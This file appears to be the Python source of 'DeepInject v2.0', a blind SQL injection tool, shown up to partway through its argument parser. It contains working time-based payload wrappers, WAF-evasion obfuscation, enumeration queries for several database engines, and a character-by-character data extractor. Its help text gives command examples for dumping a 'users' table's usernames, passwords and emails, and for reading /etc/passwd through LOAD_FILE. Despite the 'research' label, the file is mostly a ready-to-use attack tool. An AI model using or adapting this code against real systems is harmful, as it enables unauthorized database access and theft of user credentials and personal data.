#!/usr/bin/env python3
"""
DeepInject v2.0 — Advanced Blind SQL Injection Research Framework
Techniques : Time-based Blind, Boolean-based Blind
DBMS       : MySQL, MSSQL, PostgreSQL, Oracle, SQLite
Features   : WAF bypass, multipart/form/json/get/cookie/header injection,
             adaptive timing, threading, full DB enumeration, obfuscation
"""

import requests
import time
import sys
import json
import csv
import os
import argparse
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, parse_qs
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple, Any

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

__version__ = "2.0"
__author__  = "JackTekno"
__github__  = "https://github.com/JackTekno"
__license__ = "MIT"

VERSION = __version__
BANNER = r"""
  _____                 _____       _           _
 |  __ \               |_   _|     (_)         | |
 | |  | | ___  ___ _ __  | |  _ __  _  ___  ___| |_
 | |  | |/ _ \/ _ \ '_ \ | | | '_ \| |/ _ \/ __| __|
 | |__| |  __/  __/ |_) || |_| | | | |  __/ (__| |_
 |_____/ \___|\___| .__/_____|_| |_| |\___|\___|\__|
                  | |             _/ |
                  |_|            |__/

  v{ver}  |  Author : JackTekno
  Advanced Blind SQLi Research Framework
  GitHub  : https://github.com/JackTekno/DeepInject
  Source Code Repository  : https://github.com/JackTekno/DeepInject

  Techniques : Time-based | Boolean-based | Error-based
  Evasion    : WAF bypass | Obfuscation | Adaptive timing
""".format(ver=VERSION)


# ─────────────────────────────────────────────────────────────
#  OBFUSCATOR — WAF Evasion Transforms
# ─────────────────────────────────────────────────────────────

class Obfuscator:

    SPACE_SUBS = ["/**/", "/*!*/", "%09", "%0a", "%0d", "\t"]

    @staticmethod
    def hex_str(s: str) -> str:
        return "0x" + s.encode().hex()

    @staticmethod
    def char_func(s: str) -> str:
        return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"

    @staticmethod
    def inline_comment(kw: str) -> str:
        if len(kw) < 3:
            return kw
        i = random.randint(1, len(kw) - 1)
        return kw[:i] + "/**/" + kw[i:]

    @staticmethod
    def case_mix(s: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def versioned_comment(s: str, ver: str = "50000") -> str:
        return f"/*!{ver} {s}*/"

    @classmethod
    def apply(cls, payload: str, level: int = 1) -> str:
        if level == 0:
            return payload
        result = payload
        if level >= 1:
            sub = random.choice(cls.SPACE_SUBS)
            result = result.replace(" ", sub)
        if level >= 2:
            for kw in ["SELECT", "FROM", "WHERE", "AND", "OR", "IF", "SLEEP"]:
                if kw in result:
                    result = result.replace(kw, cls.case_mix(kw), 1)
        if level >= 3:
            for kw in ["SLEEP", "SELECT", "IF", "ASCII"]:
                if kw in result:
                    result = result.replace(kw, cls.inline_comment(kw), 1)
        return result


# ─────────────────────────────────────────────────────────────
#  DBMS — Queries per Database Engine
# ─────────────────────────────────────────────────────────────

class DBMS:
    MYSQL  = "mysql"
    MSSQL  = "mssql"
    PGSQL  = "pgsql"
    ORACLE = "oracle"
    SQLITE = "sqlite"

    SLEEP = {
        MYSQL:  "SLEEP({n})",
        MSSQL:  "WAITFOR DELAY '0:0:{n}'",
        PGSQL:  "pg_sleep({n})",
        ORACLE: "BEGIN DBMS_LOCK.SLEEP({n}); END",
        SQLITE: "RANDOMBLOB(500000000)",
    }

    VERSION = {
        MYSQL:  "SELECT VERSION()",
        MSSQL:  "SELECT @@VERSION",
        PGSQL:  "SELECT version()",
        ORACLE: "SELECT banner FROM v$version WHERE rownum=1",
        SQLITE: "SELECT sqlite_version()",
    }

    CURRENT_DB = {
        MYSQL:  "SELECT DATABASE()",
        MSSQL:  "SELECT DB_NAME()",
        PGSQL:  "SELECT current_database()",
        ORACLE: "SELECT ora_database_name FROM dual",
        SQLITE: "SELECT 'main'",
    }

    CURRENT_USER = {
        MYSQL:  "SELECT USER()",
        MSSQL:  "SELECT SYSTEM_USER",
        PGSQL:  "SELECT current_user",
        ORACLE: "SELECT USER FROM dual",
        SQLITE: "SELECT 'sqlite_user'",
    }

    HOSTNAME = {
        MYSQL:  "SELECT @@HOSTNAME",
        MSSQL:  "SELECT HOST_NAME()",
        PGSQL:  "SELECT inet_server_addr()",
        ORACLE: "SELECT UTL_INADDR.get_host_name FROM dual",
        SQLITE: "SELECT 'localhost'",
    }

    DATA_DIR = {
        MYSQL: "SELECT @@datadir",
        MSSQL: "SELECT SERVERPROPERTY('InstanceDefaultDataPath')",
    }

    OS_USER = {
        MYSQL: "SELECT SUBSTRING_INDEX(USER(),'@',1)",
        MSSQL: "SELECT SYSTEM_USER",
    }

    DB_COUNT = {
        MYSQL:  "SELECT COUNT(schema_name) FROM information_schema.schemata",
        MSSQL:  "SELECT COUNT(name) FROM master..sysdatabases",
        PGSQL:  "SELECT COUNT(datname) FROM pg_database WHERE datistemplate=false",
        SQLITE: "SELECT COUNT(name) FROM sqlite_master WHERE type='table'",
    }

    DB_NAME = {
        MYSQL:  "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM master..sysdatabases) t WHERE rn={idx1}",
        PGSQL:  "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY datname LIMIT 1 OFFSET {idx}",
        SQLITE: "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT {idx},1",
    }

    TABLE_COUNT = {
        MYSQL:  "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{db}'",
        MSSQL:  "SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype='U'",
        PGSQL:  "SELECT COUNT(tablename) FROM pg_tables WHERE schemaname='public'",
        SQLITE: "SELECT COUNT(name) FROM sqlite_master WHERE type='table'",
    }

    TABLE_NAME = {
        MYSQL:  "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' ORDER BY table_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM {db}..sysobjects WHERE xtype='U') t WHERE rn={idx1}",
        PGSQL:  "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename LIMIT 1 OFFSET {idx}",
        SQLITE: "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT {idx},1",
    }

    COL_COUNT = {
        MYSQL:  "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}'",
        MSSQL:  "SELECT COUNT(name) FROM {db}..syscolumns WHERE id=OBJECT_ID('{tbl}')",
        PGSQL:  "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{tbl}'",
        SQLITE: "SELECT COUNT(*) FROM pragma_table_info('{tbl}')",
    }

    COL_NAME = {
        MYSQL:  "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}' ORDER BY column_name LIMIT {idx},1",
        MSSQL:  "SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) rn,name FROM {db}..syscolumns WHERE id=OBJECT_ID('{tbl}')) t WHERE rn={idx1}",
        PGSQL:  "SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' ORDER BY column_name LIMIT 1 OFFSET {idx}",
        SQLITE: "SELECT name FROM pragma_table_info('{tbl}') ORDER BY cid LIMIT {idx},1",
    }

    DUMP_ROW = {
        MYSQL:  "SELECT IFNULL(CAST({col} AS CHAR),'~NULL~') FROM {db}.{tbl} LIMIT {idx},1",
        MSSQL:  "SELECT TOP 1 ISNULL(CAST({col} AS VARCHAR(8000)),'~NULL~') FROM {db}..{tbl} WHERE {col} NOT IN (SELECT TOP {idx} {col} FROM {db}..{tbl} ORDER BY {col}) ORDER BY {col}",
        PGSQL:  "SELECT COALESCE(CAST({col} AS TEXT),'~NULL~') FROM {tbl} ORDER BY {col} LIMIT 1 OFFSET {idx}",
        SQLITE: "SELECT IFNULL(CAST({col} AS TEXT),'~NULL~') FROM {tbl} LIMIT {idx},1",
    }

    ROW_COUNT = {
        MYSQL:  "SELECT COUNT(*) FROM {db}.{tbl}",
        MSSQL:  "SELECT COUNT(*) FROM {db}..{tbl}",
        PGSQL:  "SELECT COUNT(*) FROM {tbl}",
        SQLITE: "SELECT COUNT(*) FROM {tbl}",
    }

    PRIVS = {
        MYSQL: "SELECT GROUP_CONCAT(PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=CONCAT(QUOTE(SUBSTRING_INDEX(USER(),'@',1)),'@',QUOTE(SUBSTRING_INDEX(USER(),'@',-1)))",
    }

    WRITABLE_DIR = {
        MYSQL: "SELECT @@secure_file_priv",
    }


# ─────────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────────

@dataclass
class Config:
    url: str
    inject_param: str
    inject_type: str = "multipart"

    multipart_fields: Dict[str, Any] = field(default_factory=dict)
    file_fields: List[str] = field(default_factory=list)

    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)

    sleep_sec: int = 5
    threshold: float = 3.5
    retries: int = 3
    timeout: int = 20

    max_len: int = 128
    threads: int = 1

    dbms: str = DBMS.MYSQL
    obfuscation_level: int = 0
    payload_style: int = 6

    output_file: Optional[str] = None
    output_fmt: str = "txt"
    proxy: Optional[str] = None
    verify_ssl: bool = False
    verbose: bool = False


# ─────────────────────────────────────────────────────────────
#  INJECTION ENGINE
# ─────────────────────────────────────────────────────────────

class InjectionEngine:
    """Core timing engine — sends payloads and detects delays."""

    # 8 wrapper styles — each wraps a boolean condition into a time-based check
    WRAPPERS = [
        # 0: standard IF-SLEEP
        lambda c, n: f"IF(({c})>0,SLEEP({n}),0)",
        # 1: nested subquery
        lambda c, n: f"(SELECT(0)FROM(SELECT(SLEEP({n})))A WHERE ({c})>0)",
        # 2: XOR
        lambda c, n: f"1 XOR(IF(({c})>0,SLEEP({n}),0)) XOR 1",
        # 3: CASE WHEN
        lambda c, n: f"CASE WHEN ({c})>0 THEN SLEEP({n}) ELSE 0 END",
        # 4: ELT
        lambda c, n: f"ELT(({c})>0,SLEEP({n}))",
        # 5: AND SLEEP(IF)
        lambda c, n: f"1 AND SLEEP(IF(({c})>0,{n},0))",
        # 6: double-query XOR (original payload — strong WAF bypass)
        lambda c, n: (
            f"1 + ((SELECT 1 FROM (SELECT IF(({c})>0,SLEEP({n}),0))A))"
            f"/*'XOR(((SELECT 1 FROM (SELECT IF(({c})>0,SLEEP({n}),0))A)))OR'"
            f"|\"XOR(((SELECT 1 FROM (SELECT IF(({c})>0,SLEEP({n}),0))A)))OR\"*/"
        ),
        # 7: BENCHMARK (CPU-based, WAF-resistant)
        lambda c, n: f"(SELECT * FROM (SELECT IF(({c})>0,BENCHMARK(10000000,SHA1(1)),0))A)",
    ]

    # Probe payloads for auto-detect (no condition needed — pure sleep check)
    PROBE_STYLES = [
        ("IF-SLEEP",   lambda n: f"IF(1=1,SLEEP({n}),0)"),
        ("SUBQUERY",   lambda n: f"(SELECT(0)FROM(SELECT(SLEEP({n})))A)"),
        ("XOR",        lambda n: f"1 XOR(SLEEP({n})) XOR 1"),
        ("CASE",       lambda n: f"CASE WHEN 1=1 THEN SLEEP({n}) ELSE 0 END"),
        ("AND-SLEEP",  lambda n: f"1 AND SLEEP({n})"),
        ("DOUBLE-XOR", lambda n: (
            f"1 + ((SELECT 1 FROM (SELECT SLEEP({n}))A))"
            f"/*'XOR(((SELECT 1 FROM (SELECT SLEEP({n}))A)))OR'"
            f"|\"XOR(((SELECT 1 FROM (SELECT SLEEP({n}))A)))OR\"*/"
        )),
        ("BENCHMARK",  lambda n: f"(SELECT * FROM (SELECT BENCHMARK(10000000,SHA1(1)))A)"),
        ("COND-SUBQ",  lambda n: f"1;SELECT IF(1=1,SLEEP({n}),0)-- -"),
    ]

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.session = requests.Session()
        if cfg.proxy:
            self.session.proxies = {"http": cfg.proxy, "https": cfg.proxy}

    def _send(self, payload_value: str) -> float:
        cfg = self.cfg
        kw: Dict[str, Any] = {
            "headers": cfg.headers,
            "cookies": cfg.cookies,
            "timeout": cfg.sleep_sec + cfg.timeout,
            "verify": cfg.verify_ssl,
        }

        t0 = time.monotonic()
        try:
            if cfg.inject_type == "multipart":
                files: Dict[str, Any] = {}
                for k, v in cfg.multipart_fields.items():
                    if k in cfg.file_fields:
                        files[k] = ("", b"", "application/octet-stream")
                    else:
                        files[k] = (None, str(v))
                files[cfg.inject_param] = (None, payload_value)
                self.session.post(cfg.url, files=files, **kw)

            elif cfg.inject_type == "form":
                data = dict(cfg.multipart_fields)
                data[cfg.inject_param] = payload_value
                self.session.post(cfg.url, data=data, **kw)

            elif cfg.inject_type == "json":
                import copy
                body = copy.deepcopy(cfg.multipart_fields)
                body[cfg.inject_param] = payload_value
                self.session.post(cfg.url, json=body, **kw)

            elif cfg.inject_type == "get":
                params = dict(cfg.multipart_fields)
                params[cfg.inject_param] = payload_value
                self.session.get(cfg.url, params=params, **kw)

            elif cfg.inject_type == "cookie":
                kw2 = dict(kw)
                kw2["cookies"] = dict(cfg.cookies)
                kw2["cookies"][cfg.inject_param] = payload_value
                self.session.get(cfg.url, **kw2)

            elif cfg.inject_type == "header":
                kw2 = dict(kw)
                kw2["headers"] = dict(cfg.headers)
                kw2["headers"][cfg.inject_param] = payload_value
                self.session.get(cfg.url, **kw2)

        except requests.exceptions.Timeout:
            return time.monotonic() - t0 + cfg.sleep_sec
        except requests.exceptions.ConnectionError as e:
            print(f"\n[!] Connection error: {e}", file=sys.stderr)
            return 0.0

        return time.monotonic() - t0

    def is_delayed(self, payload: str) -> bool:
        for attempt in range(self.cfg.retries):
            elapsed = self._send(payload)
            if self.cfg.verbose:
                print(f"  [t={elapsed:.2f}s attempt={attempt+1}]", end=" ", flush=True)
            if elapsed >= self.cfg.threshold:
                return True
            if attempt < self.cfg.retries - 1:
                time.sleep(0.25)
        return False

    def inject_condition(self, condition: str) -> bool:
        style_fn = self.WRAPPERS[self.cfg.payload_style % len(self.WRAPPERS)]
        cmd = style_fn(condition, self.cfg.sleep_sec)
        if self.cfg.obfuscation_level > 0:
            cmd = Obfuscator.apply(cmd, self.cfg.obfuscation_level)
        return self.is_delayed(cmd)

    def auto_detect(self) -> bool:
        """Try all probe styles; set cfg.payload_style to first that works."""
        for i, (label, fn) in enumerate(self.PROBE_STYLES):
            probe = fn(self.cfg.sleep_sec)
            print(f"  [{i}] {label:14} ... ", end="", flush=True)
            if self.cfg.obfuscation_level > 0:
                probe = Obfuscator.apply(probe, self.cfg.obfuscation_level)
            if self.is_delayed(probe):
                print(f"DELAY DETECTED!")
                self.cfg.payload_style = i
                return True
            else:
                print("no delay")
        return False

    def verify(self) -> bool:
        """Check vulnerability using SLEEP-based probes (DOUBLE-XOR first)."""
        # DOUBLE-XOR (5) = exact payload yang terbukti bekerja
        # Skip BENCHMARK (6, CPU-based) dan COND-SUBQ (7, stacked queries)
        for i in [5, 0, 1, 2, 3, 4]:
            label = self.PROBE_STYLES[i][0]
            probe = self.PROBE_STYLES[i][1](self.cfg.sleep_sec)
            if self.cfg.verbose:
                print(f"  [probe:{label}] {probe[:80]}...")
            elapsed = self._send(probe)
            if self.cfg.verbose:
                print(f"  [elapsed] {elapsed:.2f}s")
            if elapsed >= self.cfg.threshold:
                return True
        return False

    def calibrate(self, samples: int = 3) -> float:
        print(f"  [~] Calibrating baseline ({samples} req)...", end="", flush=True)
        times = []
        for _ in range(samples):
            t = self._send("1")
            times.append(t)
            print(f" {t:.2f}s", end="", flush=True)
        times.sort()
        baseline = times[len(times) // 2]
        print(f"\n  [~] Baseline median: {baseline:.2f}s")
        suggested = max(baseline * 3, baseline + 2.0)
        if suggested > self.cfg.threshold:
            print(f"  [!] Suggested threshold: {suggested:.1f}s (current: {self.cfg.threshold}s)")
        return baseline


# ─────────────────────────────────────────────────────────────
#  DATA EXTRACTOR — Binary Search
# ─────────────────────────────────────────────────────────────

class DataExtractor:

    def __init__(self, engine: InjectionEngine):
        self.engine = engine
        self.cfg = engine.cfg

    def get_count(self, count_query: str, hi: int = 500) -> int:
        lo = 0
        while lo < hi:
            mid = (lo + hi) // 2
            if self.engine.inject_condition(f"({count_query})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def get_length(self, str_query: str) -> int:
        lo, hi = 0, self.cfg.max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self.engine.inject_condition(f"LENGTH(({str_query}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def get_char(self, str_query: str, pos: int, lo: int = 32, hi: int = 127) -> str:
        while lo < hi:
            mid = (lo + hi) // 2
            if self.engine.inject_condition(
                f"ASCII(SUBSTRING(({str_query}),{pos},1))>{mid}"
            ):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else "?"

    def extract(self, str_query: str, show: bool = True) -> str:
        length = self.get_length(str_query)
        if length == 0:
            return ""

        if self.cfg.threads > 1:
            chars: List[Optional[str]] = [None] * length
            with ThreadPoolExecutor(max_workers=self.cfg.threads) as ex:
                futures = {
                    ex.submit(self.get_char, str_query, i + 1): i
                    for i in range(length)
                }
                for fut in as_completed(futures):
                    idx = futures[fut]
                    chars[idx] = fut.result()
            result = "".join(c or "?" for c in chars)
            if show:
                print(result, end="", flush=True)
        else:
            result = ""
            for i in range(1, length + 1):
                ch = self.get_char(str_query, i)
                result += ch
                if show:
                    print(ch, end="", flush=True)

        return result


# ─────────────────────────────────────────────────────────────
#  ENUMERATOR
# ─────────────────────────────────────────────────────────────

class Enumerator:

    def __init__(self, extractor: DataExtractor):
        self.ex = extractor
        self.cfg = extractor.cfg
        self.db = self.cfg.dbms

    def _q(self, tmpl_dict: Dict, **kw) -> Optional[str]:
        tmpl = tmpl_dict.get(self.db)
        if not tmpl:
            print(f"\n[!] Query tidak tersedia untuk DBMS '{self.db}'")
            return None
        return tmpl.format(**kw)

    def _extract(self, label: str, q: str) -> str:
        print(f"  {label}: ", end="", flush=True)
        v = self.ex.extract(q)
        print()
        return v

    # ── Fingerprint ──────────────────────────────────────────

    def get_version(self) -> str:
        q = DBMS.VERSION.get(self.db, "SELECT VERSION()")
        return self._extract("Version", q)

    def get_current_db(self) -> str:
        q = DBMS.CURRENT_DB.get(self.db, "SELECT DATABASE()")
        return self._extract("Database", q)

    def get_current_user(self) -> str:
        q = DBMS.CURRENT_USER.get(self.db, "SELECT USER()")
        return self._extract("User", q)

    def get_hostname(self) -> str:
        q = DBMS.HOSTNAME.get(self.db, "SELECT @@HOSTNAME")
        return self._extract("Hostname", q)

    def get_data_dir(self) -> str:
        q = DBMS.DATA_DIR.get(self.db)
        if not q:
            return "N/A"
        return self._extract("DataDir", q)

    def get_privileges(self) -> str:
        q = DBMS.PRIVS.get(self.db)
        if not q:
            return "N/A"
        return self._extract("Privileges", q)

    def fingerprint(self) -> Dict[str, str]:
        print("\n[*] Server Fingerprint")
        print("─" * 50)
        info = {
            "version":    self.get_version(),
            "current_db": self.get_current_db(),
            "user":       self.get_current_user(),
            "hostname":   self.get_hostname(),
            "data_dir":   self.get_data_dir(),
        }
        if self.db == DBMS.MYSQL:
            info["privileges"] = self.get_privileges()
        return info

    # ── Database List ─────────────────────────────────────────

    def enum_databases(self) -> List[str]:
        print("\n[*] Enumerasi Databases")
        print("─" * 50)
        count_q = self._q(DBMS.DB_COUNT)
        if not count_q:
            return []
        total = self.ex.get_count(count_q)
        print(f"  [+] Ditemukan {total} database\n")

        dbs = []
        for idx in range(total):
            q = self._q(DBMS.DB_NAME, idx=idx, idx1=idx + 1)
            if not q:
                break
            print(f"  [{idx+1:02d}/{total}] ", end="", flush=True)
            name = self.ex.extract(q)
            print()
            dbs.append(name)
        return dbs

    # ── Table List ────────────────────────────────────────────

    def enum_tables(self, db: str) -> List[str]:
        print(f"\n[*] Enumerasi Tables di '{db}'")
        print("─" * 50)
        count_q = self._q(DBMS.TABLE_COUNT, db=db)
        if not count_q:
            return []
        total = self.ex.get_count(count_q)
        print(f"  [+] Ditemukan {total} tabel\n")

        tables = []
        for idx in range(total):
            q = self._q(DBMS.TABLE_NAME, db=db, idx=idx, idx1=idx + 1)
            if not q:
                break
            print(f"  [{idx+1:02d}/{total}] ", end="", flush=True)
            name = self.ex.extract(q)
            print()
            tables.append(name)
        return tables

    # ── Column List ───────────────────────────────────────────

    def enum_columns(self, db: str, table: str) -> List[str]:
        print(f"\n[*] Enumerasi Columns di '{db}.{table}'")
        print("─" * 50)
        count_q = self._q(DBMS.COL_COUNT, db=db, tbl=table)
        if not count_q:
            return []
        total = self.ex.get_count(count_q)
        print(f"  [+] Ditemukan {total} kolom\n")

        cols = []
        for idx in range(total):
            q = self._q(DBMS.COL_NAME, db=db, tbl=table, idx=idx, idx1=idx + 1)
            if not q:
                break
            print(f"  [{idx+1:02d}/{total}] ", end="", flush=True)
            name = self.ex.extract(q)
            print()
            cols.append(name)
        return cols

    # ── Data Dump ─────────────────────────────────────────────

    def dump_table(self, db: str, table: str, columns: List[str], limit: int = 50) -> List[Dict]:
        print(f"\n[*] Dump '{db}.{table}' [{', '.join(columns)}]")
        print("─" * 50)
        count_q = self._q(DBMS.ROW_COUNT, db=db, tbl=table)
        if not count_q:
            return []
        total = min(self.ex.get_count(count_q), limit)
        print(f"  [+] Total baris: {total} (maks dump: {limit})\n")

        rows = []
        for idx in range(total):
            row: Dict[str, str] = {}
            for col in columns:
                q = self._q(DBMS.DUMP_ROW, db=db, tbl=table, col=col, idx=idx, idx1=idx + 1)
                if not q:
                    row[col] = "?"
                    continue
                print(f"  [{idx+1}/{total}] {col:20}: ", end="", flush=True)
                val = self.ex.extract(q)
                print()
                row[col] = val
            rows.append(row)
        return rows


# ─────────────────────────────────────────────────────────────
#  REPORTER
# ─────────────────────────────────────────────────────────────

class Reporter:

    def __init__(self, path: Optional[str], fmt: str = "txt"):
        self.path = path
        self.fmt = fmt
        self.sections: Dict[str, Any] = {}

    def add(self, key: str, value: Any):
        self.sections[key] = value

    def save(self):
        if not self.path:
            return
        if self.fmt == "json":
            with open(self.path, "w", encoding="utf-8") as f:
                json.dump(self.sections, f, indent=2, default=str)
        elif self.fmt == "csv":
            with open(self.path, "w", newline="", encoding="utf-8") as f:
                for key, rows in self.sections.items():
                    if isinstance(rows, list) and rows and isinstance(rows[0], dict):
                        w = csv.DictWriter(f, fieldnames=rows[0].keys())
                        w.writeheader()
                        w.writerows(rows)
        else:
            with open(self.path, "w", encoding="utf-8") as f:
                for k, v in self.sections.items():
                    f.write(f"\n{'='*60}\n{k}\n{'='*60}\n")
                    if isinstance(v, list):
                        for i, item in enumerate(v, 1):
                            if isinstance(item, dict):
                                f.write(f"  [{i}] " + " | ".join(f"{dk}={dv}" for dk, dv in item.items()) + "\n")
                            else:
                                f.write(f"  [{i}] {item}\n")
                    elif isinstance(v, dict):
                        for dk, dv in v.items():
                            f.write(f"  {dk}: {dv}\n")
                    else:
                        f.write(f"  {v}\n")
        print(f"\n[+] Hasil disimpan → {self.path}")


# ─────────────────────────────────────────────────────────────
#  CLI HELPERS
# ─────────────────────────────────────────────────────────────

def parse_kv(s: str, sep: str = ",") -> Dict[str, str]:
    """'key1=val1,key2=val2' → dict"""
    if not s:
        return {}
    result: Dict[str, str] = {}
    for part in s.split(sep):
        if "=" in part:
            k, _, v = part.partition("=")
            result[k.strip()] = v
        else:
            result[part.strip()] = ""
    return result


def parse_cookies(s: str) -> Dict[str, str]:
    """'k1=v1; k2=v2' → dict"""
    return parse_kv(s.replace(";", ","))


def default_headers(extra: List[str]) -> Dict[str, str]:
    h = {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-us,en;q=0.5",
        "Cache-Control":   "no-cache",
    }
    for item in extra:
        if ": " in item:
            k, _, v = item.partition(": ")
            h[k.strip()] = v.strip()
        elif ":" in item:
            k, _, v = item.partition(":")
            h[k.strip()] = v.strip()
    return h


# ─────────────────────────────────────────────────────────────
#  ARGUMENT PARSER
# ─────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="deepinject",
        description="DeepInject v2.0 — Advanced Blind SQLi Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
─────────────────────────────────────────────────────────
 CONTOH PENGGUNAAN
─────────────────────────────────────────────────────────

  # Multipart/form-data (form dengan file upload)
  # --param    : nama field yang vulnerable
  # --fields   : field lain di form (key=value, pisah koma)
  # --file-fields : field yang bertipe file upload
  python deepinject.py -u https://target.local/page.php \\
    --type multipart --param target_field \\
    --fields "field1=value1,field2=value2" \\
    --file-fields file_field \\
    --cookie "PHPSESSID=your_session_here" \\
    --enum-db

  # POST form biasa (application/x-www-form-urlencoded)
  python deepinject.py -u https://target.local/login.php \\
    --type form --param search \\
    --fields "category=news,page=1" \\
    --obfuscate 2 --payload-style 1 \\
    --enum-tables --db target_db

  # GET parameter
  python deepinject.py -u "https://target.local/item.php" \\
    --type get --param id \\
    --enum-db --fingerprint

  # JSON API body
  python deepinject.py -u https://target.local/api/search \\
    --type json --param keyword \\
    --json-body '{"keyword":"x","limit":10}' \\
    --enum-tables --db target_db

  # Cookie injection
  python deepinject.py -u https://target.local/dashboard \\
    --type cookie --param user_token \\
    --enum-db

  # Header injection (mis. X-Forwarded-For, User-Agent)
  python deepinject.py -u https://target.local/page.php \\
    --type header --param X-Forwarded-For \\
    --enum-db

  # Dump tabel tertentu, output JSON
  python deepinject.py -u https://target.local/page.php \\
    --type multipart --param target_field \\
    --fields "field1=value1" --file-fields file_field \\
    --cookie "PHPSESSID=your_session_here" \\
    --dump --db target_db --table users \\
    --columns "id,username,password,email" \\
    -o hasil_dump.json --fmt json

  # Auto-detect payload style (WAF bypass otomatis)
  python deepinject.py -u https://target.local/page.php \\
    --type multipart --param target_field \\
    --fields "field1=value1" --file-fields file_field \\
    --cookie "PHPSESSID=your_session_here" \\
    --auto-detect

  # Custom query manual
  python deepinject.py -u https://target.local/page.php \\
    --type get --param id \\
    --query "SELECT LOAD_FILE('/etc/passwd')"

─────────────────────────────────────────────────────────
 PAYLOAD STYLES (--payload-style N)
─────────────────────────────────────────────────────────
  0  IF(cond,SLEEP(n),0)                    — standard
  1  (SELECT 0 FROM(SELECT SLEEP)A WHERE)   — nested subquery
  2  1 XOR(IF(cond,SLEEP,0)) XOR 1         — XOR obfuscation
  3  CASE WHEN cond THEN SLEEP ELSE 0 END  — CASE WHEN
  4  ELT(cond,SLEEP(n))                    — ELT function
  5  1 AND SLEEP(IF(cond,n,0))             — AND SLEEP
  6  double-query XOR comment              — WAF bypass (default)
  7  BENCHMARK(10000000,SHA1(1))           — CPU-based

─────────────────────────────────────────────────────────
 OBFUSCATION LEVELS (--obfuscate N)
─────────────────────────────────────────────────────────
  0  None (clean payload)
  1  Space → /**/ or %09
  2  + keyword case mixing (SeLeCt, SlEeP)
  3  + inline comment splitting (SL/**/EEP)
─────────────────────────────────────────────────────────
"""
    )

    # Target
    t = p.add_argument_group("Target")
    t.add_argument("-u", "--url",   required=True, help="URL target")
    t.add_argument("--type",        default="multipart",
                   choices=["multipart", "form", "json", "get", "cookie", "header"],
                   help="Tipe injection (default: multipart)")
    t.add_argument("--param",       required=True, help="Nama parameter yang di-inject")
    t.add_argument("--fields",      default="", help="Field tambahan: key1=val1,key2=val2")
    t.add_argument("--file-fields", default="", dest="file_fields",
                   help="Field file-upload di multipart (pisah koma): file1,file2")
    t.add_argument("--json-body",   default="", dest="json_body",
                   help="JSON body string untuk --type json")

    # Auth
    a = p.add_argument_group("Auth & Headers")
    a.add_argument("--cookie", default="", help="Cookie: key1=val1;key2=val2")
    a.add_argument("-H", "--header", action="append", default=[], metavar="HEADER",
                   help="Header tambahan (bisa diulang): -H 'Referer: https://...'")

    # DBMS
    d = p.add_argument_group("DBMS")
    d.add_argument("--dbms", default="mysql",
                   choices=["mysql", "mssql", "pgsql", "oracle", "sqlite"],
                   help="Target DBMS (default: mysql)")

    # Timing
    ti = p.add_argument_group("Timing")
    ti.add_argument("--sleep",     type=int,   default=5,   help="Sleep seconds (default: 5)")
    ti.add_argument("--threshold", type=float, default=3.5, help="Threshold deteksi (default: 3.5)")
    ti.add_argument("--retries",   type=int,   default=3,   help="Retry per request (default: 3)")
    ti.add_argument("--timeout",   type=int,   default=20,  help="Request timeout (default: 20)")

    # Extraction
    ex = p.add_argument_group("Extraction")
    ex.add_argument("--max-len",  type=int, default=128, dest="max_len",
                    help="Panjang string maks (default: 128)")
    ex.add_argument("--threads",  type=int, default=1,
                    help="Thread parallel char extraction (default: 1)")

    # Evasion
    ev = p.add_argument_group("Evasion")
    ev.add_argument("--obfuscate",     type=int, default=0, choices=[0,1,2,3],
                    help="Level obfuscation 0-3 (default: 0)")
    ev.add_argument("--payload-style", type=int, default=6, dest="payload_style",
                    help="Payload wrapper 0-7 (default: 6)")
    ev.add_argument("--proxy",         default=None, help="Proxy: http://127.0.0.1:8080")
    ev.add_argument("--verbose", "-v", action="store_true",
                    help="Tampilkan payload dan elapsed time tiap request")

    # Actions
    ac = p.add_argument_group("Actions")
    ac.add_argument("--auto-detect",  action="store_true", dest="auto_detect",
                    help="Auto-detect payload style yang berhasil")
    ac.add_argument("--calibrate",    action="store_true",
                    help="Kalibrasi baseline response time")
    ac.add_argument("--verify",       action="store_true",
                    help="Hanya verifikasi kerentanan lalu keluar")
